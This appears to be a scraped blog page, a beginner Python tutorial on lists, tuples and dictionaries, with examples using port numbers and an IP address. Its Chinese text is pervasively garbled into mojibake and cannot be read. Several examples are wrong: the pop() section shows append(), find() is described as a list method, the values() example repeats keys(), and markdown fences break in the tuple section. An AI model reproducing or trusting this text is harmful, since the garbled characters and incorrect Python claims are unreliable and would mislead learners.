class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">In [<span class="number">39</span>]: t_list</span><br><span class="line">Out[<span class="number">39</span>]: [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: t_list</span><br><span class="line">Out[<span class="number">40</span>]: [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: t_list = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">42</span>]: t_list.extend([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">In [<span class="number">43</span>]: t_list</span><br><span class="line">Out[<span class="number">43</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><h3 id="del-å…³é”®å­—ç§‘æ™®">del å…³é”®å­—ï¼ˆç§‘æ™®ï¼‰</h3><ul><li>ä½¿ç”¨ <code>del</code> å…³é”®å­—( <code>delete</code> )åŒæ ·å¯ä»¥åˆ é™¤åˆ—è¡¨ä¸­å…ƒç´ </li><li><code>del</code> å…³é”®å­—æœ¬è´¨ä¸Šæ˜¯ç”¨æ¥<strong>å°†ä¸€ä¸ªå˜é‡ä»å†…å­˜ä¸­åˆ é™¤çš„</strong></li><li>å¦‚æœä½¿ç”¨ <code>del</code>å…³é”®å­—å°†å˜é‡ä»å†…å­˜ä¸­åˆ é™¤ï¼Œåç»­çš„ä»£ç å°±ä¸èƒ½å†ä½¿ç”¨è¿™ä¸ªå˜é‡äº†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> name_list[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œè¦ä»åˆ—è¡¨åˆ é™¤æ•°æ®ï¼Œå»ºè®®<strong>ä½¿ç”¨åˆ—è¡¨æä¾›çš„æ–¹æ³•</strong></p></blockquote><h3 id="å…³é”®å­—å‡½æ•°å’Œæ–¹æ³•ç§‘æ™®">å…³é”®å­—ã€å‡½æ•°å’Œæ–¹æ³•ï¼ˆç§‘æ™®ï¼‰</h3><ul><li><strong>å…³é”®å­—</strong> æ˜¯ Python å†…ç½®çš„ã€å…·æœ‰ç‰¹æ®Šæ„ä¹‰çš„æ ‡è¯†ç¬¦</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> keyword</span><br><span class="line">In [<span class="number">2</span>]: <span class="built_in">print</span>(keyword.kwlist)</span><br><span class="line">In [<span class="number">3</span>]: <span class="built_in">print</span>(<span class="built_in">len</span>(keyword.kwlist))</span><br></pre></td></tr></table></figure><blockquote><p>å…³é”®å­—åé¢ä¸éœ€è¦ä½¿ç”¨æ‹¬å·</p></blockquote><ul><li><strong>å‡½æ•°</strong> å°è£…äº†ç‹¬ç«‹åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‡½æ•°å(å‚æ•°)</span><br></pre></td></tr></table></figure><blockquote><p>å‡½æ•°éœ€è¦æ­»è®°ç¡¬èƒŒ</p></blockquote><ul><li><strong>æ–¹æ³•</strong> å’Œå‡½æ•°ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯å°è£…äº†ç‹¬ç«‹çš„åŠŸèƒ½</li><li><strong>æ–¹æ³•</strong> éœ€è¦é€šè¿‡ <strong>å¯¹è±¡</strong>æ¥è°ƒç”¨ï¼Œè¡¨ç¤ºé’ˆå¯¹è¿™ä¸ª <strong>å¯¹è±¡</strong> è¦åšçš„æ“ä½œ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹è±¡.æ–¹æ³•å(å‚æ•°)</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨å˜é‡åé¢è¾“å…¥ <code>.</code>ï¼Œç„¶åé€‰æ‹©é’ˆå¯¹è¿™ä¸ªå˜é‡è¦æ‰§è¡Œçš„æ“ä½œï¼Œè®°å¿†èµ·æ¥æ¯”å‡½æ•°è¦ç®€å•å¾ˆå¤š</p></blockquote><h2 id="å¾ªç¯éå†">å¾ªç¯éå†</h2><ul><li><strong>éå†</strong> å°±æ˜¯ <strong>ä»å¤´åˆ°å°¾</strong><strong>ä¾æ¬¡</strong> ä» <strong>åˆ—è¡¨</strong> ä¸­è·å–æ•°æ®<ul><li>åœ¨ <strong>å¾ªç¯ä½“å†…éƒ¨</strong> é’ˆå¯¹<strong>æ¯ä¸€ä¸ªå…ƒç´ </strong>ï¼Œæ‰§è¡Œç›¸åŒçš„æ“ä½œ</li></ul></li><li>åœ¨ <code>Python</code> ä¸­ä¸ºäº†æé«˜åˆ—è¡¨çš„éå†æ•ˆç‡ï¼Œä¸“é—¨æä¾›çš„<strong>è¿­ä»£ iteration éå†</strong></li><li>ä½¿ç”¨ <code>for</code> å°±èƒ½å¤Ÿå®ç°è¿­ä»£éå†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for å¾ªç¯å†…éƒ¨ä½¿ç”¨çš„å˜é‡ in åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line"></span><br><span class="line">    å¾ªç¯å†…éƒ¨é’ˆå¯¹åˆ—è¡¨å…ƒç´ è¿›è¡Œæ“ä½œ</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/1584284533_20200225174303701_6227.png" /></p><h2 id="åº”ç”¨åœºæ™¯">åº”ç”¨åœºæ™¯</h2><ul><li>å°½ç®¡ <code>Python</code> çš„ <strong>åˆ—è¡¨</strong> ä¸­å¯ä»¥<strong>å­˜å‚¨ä¸åŒç±»å‹çš„æ•°æ®</strong></li><li>ä½†æ˜¯åœ¨å¼€å‘ä¸­ï¼Œæ›´å¤šçš„åº”ç”¨åœºæ™¯æ˜¯<ol type="1"><li><strong>åˆ—è¡¨å­˜å‚¨ç›¸åŒç±»å‹çš„æ•°æ®</strong></li><li>é€šè¿‡<strong>è¿­ä»£éå†</strong>ï¼Œåœ¨å¾ªç¯ä½“å†…éƒ¨ï¼Œé’ˆå¯¹åˆ—è¡¨ä¸­çš„æ¯ä¸€é¡¹å…ƒç´ ï¼Œæ‰§è¡Œç›¸åŒçš„æ“ä½œ</li></ol></li></ul><h1 id="åˆ—è¡¨å¸¸ç”¨æ–¹æ³•">åˆ—è¡¨å¸¸ç”¨æ–¹æ³•</h1><p>åˆ—è¡¨ä¸­çš„æ•°æ®å¯å˜ï¼Œç±»å‹å¯ä¸ä¸€è‡´</p><p>ç´¢å¼•ï¼š</p><ol type="1"><li>ç¬¬ä¸€ä¸ªå…ƒç´ ç´¢å¼•ä¸º 0ï¼Œå€’æ•°ç¬¬ä¸€ä¸ªå…ƒç´ ç´¢å¼•ä¸º-1</li><li>Range of Indexes æ ¹æ®ç´¢å¼•æŒ‡å®šå– list ä¸­çš„å“ªä¸€æ®µï¼šlist[2:5]ï¼Œå‰é—­åå¼€ï¼ŒåŒ…å« list[2]ï¼Œä¸åŒ…å« list[5]ã€‚æ­¤å¤–ï¼Œï¼šå‰æˆ–åçš„å…ƒç´ ä¸ iå†™ï¼Œè¡¨ç¤ºåˆ°å¤´æˆ–å°¾ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports=[<span class="number">21</span>,<span class="number">22</span>,<span class="number">3306</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">2</span>]</span><br><span class="line"><span class="number">3306</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[-<span class="number">1</span>]</span><br><span class="line"><span class="number">3306</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">[<span class="number">21</span>, <span class="number">22</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">1</span>:]</span><br><span class="line">[<span class="number">22</span>,<span class="number">3306</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[:<span class="number">2</span>]</span><br><span class="line">[<span class="number">21</span>, <span class="number">22</span>]</span><br></pre></td></tr></table></figure><p>append()æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports.append(<span class="string">&#x27;ssh&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports</span><br><span class="line">[<span class="number">21</span>, <span class="number">22</span>, <span class="number">3306</span>, <span class="string">&#x27;ssh&#x27;</span>]</span><br></pre></td></tr></table></figure><p>len(list) é•¿åº¦</p><p>åˆ é™¤å…ƒç´ ï¼š</p><p>pop() åŸºäºç´¢å¼•åˆ é™¤</p><p>The <code>pop()</code> method removes the specified index, (or thelast item if index is not specified):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ports.append(8080)</span><br><span class="line">&gt;&gt;&gt; ports</span><br><span class="line">[21, 22, 3306, 8080]</span><br></pre></td></tr></table></figure><p>remove åŸºäºå€¼åˆ é™¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ports.remove(&#x27;ssh&#x27;)</span><br></pre></td></tr></table></figure><p>index()</p><p>The <code>index()</code> method finds the <strong>first</strong>occurrence of the specified value.</p><p>ç¡®å®šå€¼çš„ç´¢å¼•ï¼Œç„¶åä½¿ç”¨ç´¢å¼•æ¥ä¿®æ”¹å€¼ã€‚å¦‚æœä¸å­˜åœ¨è¯¥å€¼ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports.index(<span class="number">3306</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">2</span>]=<span class="number">45</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">2</span>]</span><br><span class="line"><span class="number">45</span></span><br></pre></td></tr></table></figure><p>find() ä¸ index()ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯æ‰¾ä¸åˆ°å€¼ï¼Œä¼šè¿”å›-1ï¼Œè€Œä¸ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><p>rindex() The <code>rindex()</code> method finds the last occurrenceof the specified value.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip[<span class="number">0</span>:ip.rindex(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"><span class="string">&#x27;192.168.1&#x27;</span></span><br></pre></td></tr></table></figure><p>list(str) å°†å­—ç¬¦ä¸²é€ä¸ªå­—ç¬¦æ‹†åˆ†æˆåˆ—è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼š</p><p>å»é™¤ IP çš„ D æ®µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•ä¸€ï¼š</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip[<span class="number">0</span>:ip.rindex(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"><span class="string">&#x27;192.168.1&#x27;</span></span><br><span class="line">æ–¹æ³•äºŒï¼š</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip=<span class="string">&#x27;192.168.1.2&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;.&#x27;</span>.join(ip.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="string">&#x27;192.168.1&#x27;</span></span><br><span class="line">æ–¹æ³•ä¸‰ï¼š</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip_list[<span class="number">0</span>]+<span class="string">&#x27;.&#x27;</span>+ip_list[<span class="number">1</span>]+<span class="string">&#x27;.&#x27;</span>+ip_list[<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;192.168.1&#x27;</span></span><br></pre></td></tr></table></figure><p>å…ƒç»„ï¼š</p><p>å…ƒç»„ä¸å¯å˜ï¼Œåªæœ‰ï¼šcount å’Œ index æ–¹æ³•ã€‚</p><p>å¦‚æœå…ƒç»„ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆåœ¨å…ƒç´ åé¢å¿…é¡»åŠ ä¸Šé€—å·ï¼Œå¦åˆ™å°±æˆäº†å•ä¸ªæ•°å­—äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x=(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x=(<span class="number">1</span>,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">(<span class="number">1</span>,)</span><br></pre></td></tr></table></figure><p>å­—å…¸ï¼š</p><p>åˆ—è¡¨ä¸­å­˜æ”¾å¤§é‡æ•°æ®æ—¶ï¼ŒæŸ¥æ‰¾æ€§èƒ½ä¼šä¸‹é™ã€‚å­—å…¸é€‚åˆå­˜å‚¨å¤§é‡æ•°æ®ã€‚</p><p>å­—å…¸çš„ä¼˜ç‚¹æ˜¯å…·æœ‰æå¿«çš„æŸ¥æ‰¾é€Ÿåº¦ï¼Œå­—å…¸ä½¿ç”¨{}å®šä¹‰ã€‚å­—å…¸ä½¿ç”¨ keyï¼švalueå½¢å¼å­˜å‚¨ã€‚each pair is called one item. å­—å…¸ä¸­çš„æ¯ä¸ª key ä¸å…¶ valueéƒ½æ˜¯ä»¥å†’å·åˆ†éš”ï¼ŒåŒæ—¶ç”¨éƒ½å¥½åˆ†å‰²æ¯ä¸€é¡¹ã€‚</p><p>å­—å…¸ä¸­æ²¡æœ‰ç´¢å¼•ï¼Œå­—å…¸ä¸­çš„é”®æ˜¯å”¯ä¸€çš„ï¼Œå€¼éšä¾¿ï¼Œå¯é‡å¤ã€‚å­—å…¸ä¸­çš„å€¼ä¹Ÿå¯ä»¥æ”¹ã€‚</p><p>keys() æŸ¥çœ‹æ‰€æœ‰é”®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>service</span><br><span class="line">&#123;<span class="string">&#x27;ftp&#x27;</span>: <span class="number">21</span>, <span class="string">&#x27;ssh&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;http&#x27;</span>: <span class="number">80</span>, <span class="string">&#x27;mysql&#x27;</span>: <span class="number">3306</span>, <span class="string">&#x27;rdp&#x27;</span>: <span class="number">3389</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>service[<span class="string">&#x27;ftp&#x27;</span>]</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>service.keys()</span><br><span class="line">dict_keys([<span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;ssh&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;rdp&#x27;</span>])</span><br></pre></td></tr></table></figure><p>values() æ–¹æ³•æŸ¥çœ‹æ‰€æœ‰å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>service.keys()</span><br><span class="line">dict_keys([<span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;ssh&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;rdp&#x27;</span>])</span><br></pre></td></tr></table></figure><p>å­—å…¸çš„éå†ï¼š</p><p>éå†é”®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> service:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>éå†å€¼:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> service:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(service[i])</span><br></pre></td></tr></table></figure><p>åŒæ—¶éå†é”®å’Œå€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> service:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;service[i]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="å…ƒç»„">å…ƒç»„</h1><h2 id="å…ƒç»„çš„å®šä¹‰">å…ƒç»„çš„å®šä¹‰</h2><ul><li><code>Tuple</code> ï¼ˆå…ƒç»„ï¼‰ä¸åˆ—è¡¨ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºå…ƒç»„çš„<strong>å…ƒç´ ä¸èƒ½ä¿®æ”¹</strong><ul><li><strong>å…ƒç»„</strong> è¡¨ç¤ºå¤šä¸ªå…ƒç´ ç»„æˆçš„åºåˆ—</li><li><strong>å…ƒç»„</strong> åœ¨ <code>Python</code>å¼€å‘ä¸­ï¼Œæœ‰ç‰¹å®šçš„åº”ç”¨åœºæ™¯</li></ul></li><li>ç”¨äºå­˜å‚¨ <strong>ä¸€ä¸² ä¿¡æ¯</strong>ï¼Œ<strong>æ•°æ®</strong> ä¹‹é—´ä½¿ç”¨<code>,</code> åˆ†éš”</li><li>å…ƒç»„ç”¨ <code>()</code> å®šä¹‰</li><li>å…ƒç»„çš„ <strong>ç´¢å¼•</strong> ä» <code>0</code> å¼€å§‹<ul><li><strong>ç´¢å¼•</strong> å°±æ˜¯æ•°æ®åœ¨ <strong>å…ƒç»„</strong>ä¸­çš„ä½ç½®ç¼–å·</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info_tuple = (<span class="string">&quot;zhangsan&quot;</span>, <span class="number">18</span>, <span class="number">1.75</span>)</span><br></pre></td></tr></table></figure><h2 id="åˆ›å»ºç©ºå…ƒç»„">åˆ›å»ºç©ºå…ƒç»„</h2><p>æ³¨æ„ï¼šåœ¨å¼€å‘ä¸­å‡ ä¹ä¸å®šä¹‰ç©ºå…ƒç»„ï¼Œå› ä¸ºå…ƒç»„æ˜¯ä¸å¯å˜çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info_tuple = ()</span><br></pre></td></tr></table></figure><h2id="å…ƒç»„ä¸­-åªåŒ…å«ä¸€ä¸ªå…ƒç´ -æ—¶éœ€è¦åœ¨å…ƒç´ åé¢æ·»åŠ é€—å·-å¦åˆ™å°±åªæ˜¯ä¸­å•ä¸ªå…ƒç´ çš„é‚£ç§ç±»å‹">å…ƒç»„ä¸­<strong>åªåŒ…å«ä¸€ä¸ªå…ƒç´ </strong>æ—¶ï¼Œéœ€è¦<strong>åœ¨å…ƒç´ åé¢æ·»åŠ é€—å·</strong>,å¦åˆ™å°±åªæ˜¯()ä¸­å•ä¸ªå…ƒç´ çš„é‚£ç§ç±»å‹</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">info_tuple = (<span class="number">50</span>, )</span><br><span class="line">In [<span class="number">12</span>]: <span class="built_in">type</span>(info_tuple)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="built_in">tuple</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: single=(<span class="string">&quot;world&quot;</span>)</span><br><span class="line">In [<span class="number">12</span>]: <span class="built_in">type</span>(single)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="built_in">str</span></span><br></pre></td></tr></table></figure><h2 id="å…ƒç»„å¸¸ç”¨æ“ä½œ">å…ƒç»„å¸¸ç”¨æ“ä½œ</h2><ul><li>å–å€¼ä¸å–ç´¢å¼•</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    In [<span class="number">22</span>]: info</span><br><span class="line">    Out[<span class="number">22</span>]: (<span class="string">&#x27;zhangsan&#x27;</span>, <span class="number">18</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    In [<span class="number">23</span>]: info[<span class="number">0</span>]</span><br><span class="line">    Out[<span class="number">23</span>]: <span class="string">&#x27;zhangsan&#x27;</span></span><br><span class="line">    In [<span class="number">25</span>]: info.index(<span class="string">&quot;zhangsan&quot;</span>)</span><br><span class="line">    Out[<span class="number">25</span>]: <span class="number">0</span></span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line">* ç»Ÿè®¡è®¡æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">  In [<span class="number">26</span>]: info = (<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>In [27]: info.count(3)<br />Out[27]: 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## å¾ªç¯éå†</span><br><span class="line"></span><br><span class="line">* **å–å€¼** å°±æ˜¯ä» **å…ƒç»„** ä¸­è·å–å­˜å‚¨åœ¨æŒ‡å®šä½ç½®çš„æ•°æ®</span><br><span class="line">* **éå†** å°±æ˜¯ **ä»å¤´åˆ°å°¾** **ä¾æ¬¡** ä» **å…ƒç»„** ä¸­è·å–æ•°æ®</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"># for å¾ªç¯å†…éƒ¨ä½¿ç”¨çš„å˜é‡ in å…ƒç»„</span><br><span class="line">for item in info:</span><br><span class="line"></span><br><span class="line">    å¾ªç¯å†…éƒ¨é’ˆå¯¹å…ƒç»„å…ƒç´ è¿›è¡Œæ“ä½œ</span><br><span class="line">    print(item)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><ul><li>åœ¨ <code>Python</code> ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ <code>for</code>å¾ªç¯éå†æ‰€æœ‰éæ•°å­—å‹ç±»å‹çš„å˜é‡ï¼š<strong>åˆ—è¡¨</strong>ã€<strong>å…ƒç»„</strong>ã€<strong>å­—å…¸</strong>ä»¥åŠ <strong>å­—ç¬¦ä¸²</strong></li><li>æç¤ºï¼šåœ¨å®é™…å¼€å‘ä¸­ï¼Œé™¤é<strong>èƒ½å¤Ÿç¡®è®¤å…ƒç»„ä¸­çš„æ•°æ®ç±»å‹</strong>ï¼Œå¦åˆ™é’ˆå¯¹å…ƒç»„çš„å¾ªç¯éå†éœ€æ±‚å¹¶ä¸æ˜¯å¾ˆå¤š</li></ul></blockquote><h2 id="åº”ç”¨åœºæ™¯-1">åº”ç”¨åœºæ™¯</h2><ul><li>å°½ç®¡å¯ä»¥ä½¿ç”¨ <code>for in</code> éå† <strong>å…ƒç»„</strong></li><li>ä½†æ˜¯åœ¨å¼€å‘ä¸­ï¼Œæ›´å¤šçš„åº”ç”¨åœºæ™¯æ˜¯ï¼š<ul><li>å…ƒç»„ä¸€èˆ¬å­˜å‚¨ä¸åŒç±»å‹çš„æ•°æ®</li><li><strong>å‡½æ•°çš„ å‚æ•° å’Œ è¿”å›å€¼</strong>ï¼Œä¸€ä¸ªå‡½æ•°å¯ä»¥æ¥æ”¶<strong>ä»»æ„å¤šä¸ªå‚æ•°</strong>ï¼Œæˆ–è€… <strong>ä¸€æ¬¡è¿”å›å¤šä¸ªæ•°æ®</strong><ul><li>æœ‰å…³ <strong>å‡½æ•°çš„å‚æ•° å’Œ è¿”å›å€¼</strong>ï¼Œåœ¨åç»­<strong>å‡½æ•°é«˜çº§</strong> ç»™å¤§å®¶ä»‹ç»</li></ul></li><li><strong>æ ¼å¼å­—ç¬¦ä¸²</strong>ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸² % åé¢çš„ <code>()</code>æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå…ƒç»„</li><li><strong>è®©åˆ—è¡¨ä¸å¯ä»¥è¢«ä¿®æ”¹</strong>ï¼Œå³ï¼šå°†åˆ—è¡¨è½¬æ¢ä¸ºå…ƒç»„ï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤æ•°æ®å®‰å…¨çš„ç›®çš„ã€‚</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info = (<span class="string">&quot;zhangsan&quot;</span>, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;info[<span class="number">0</span>]&#125;</span> çš„å¹´é¾„æ˜¯<span class="subst">&#123;info[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">zhangsan çš„å¹´é¾„æ˜¯<span class="number">18</span></span><br></pre></td></tr></table></figure><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„å…ƒç»„">æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„å…ƒç»„</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">infor_tuple=(<span class="string">&quot;å°æ˜&quot;</span>ï¼Œ <span class="number">21</span>ï¼Œ <span class="number">1.78</span>)</span><br><span class="line"><span class="comment"># æ 